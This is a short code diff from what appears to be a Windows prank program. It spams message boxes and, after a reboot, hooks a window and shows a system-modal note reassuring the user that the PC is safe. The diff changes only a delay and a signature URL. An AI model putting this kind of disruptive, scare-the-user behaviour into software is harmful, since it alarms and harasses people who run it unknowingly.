@@ -278,7 +278,7 @@ int __stdcall WinMain(HINSTANCE hI, HINSTANCE, LPSTR, int)
 		if (lstrcmpA(__argv[1], "msg") == 0)
 		{
 			CreateThread(0, 0, &SpamMsg, 0, 0, 0); //Spam message boxes
-			Sleep(5000);
+			Sleep(10000);
 			stop = true;
 
 			return 0;
@@ -303,7 +303,7 @@ int __stdcall WinMain(HINSTANCE hI, HINSTANCE, LPSTR, int)
 		{
 			//Message box after reboot
 			HHOOK hook = SetWindowsHookExA(WH_CALLWNDPROCRET, FckBtn, 0, GetCurrentThreadId());
-			MessageBoxA(0, "Don't worry ur pc is safe, dude\nHope u didn't smash ur monitor!\n\nCrafted by AleXandro-1337\nhttps://www.youtube.com/channel/UCsUr0KZsVZK1bHdDtQMmz6Q", LOL, MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
+			MessageBoxA(0, "Don't worry ur pc is safe, dude\nHope u didn't smash ur monitor!\n\nCrafted by AleXandro-1337\nhttps://youtube.com/@AleXandro-1337", LOL, MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
 			UnhookWindowsHookEx(hook);
 
 			return 0;
